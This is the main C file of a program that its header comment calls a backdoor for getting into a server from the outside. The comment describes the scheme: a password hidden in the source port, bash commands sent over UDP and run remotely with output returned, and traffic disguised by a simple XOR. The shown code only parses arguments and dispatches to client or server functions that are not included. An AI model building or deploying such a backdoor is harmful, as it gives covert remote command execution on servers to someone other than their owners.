#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include "functions.h"

/**
 *  Backdoor program used to access a server from the outside.
 * 
 *  Author: Haile Peter
 *
 *  Takes a password in client or server mode which will be sent
 *  over the network as a source port. Once this authentication is
 *  complete, the client send a udp datagram to the server with a 
 *  bash command. The server executes this command and sends back
 *  output. All communication (after authentication) is done with
 *  XOR on bytes by 2. 
 * 
 * */


//Entry point of application, checks arguments and selected mode.
int main(int argc, char **argv)
{
	int server = 0;
	char *src_host, *dest_host, *password, *command, *interface;

	if(check_arguments(argc, argv, &server, &dest_host, &src_host, &password, &command, &interface) == 0)
		exit(0);

	if(server == 1)
		execute_server(password, src_host, interface);
	else
  		execute_client(password, dest_host, command);

	free(src_host);
	free(dest_host);
	free(password);
	exit(0);
}
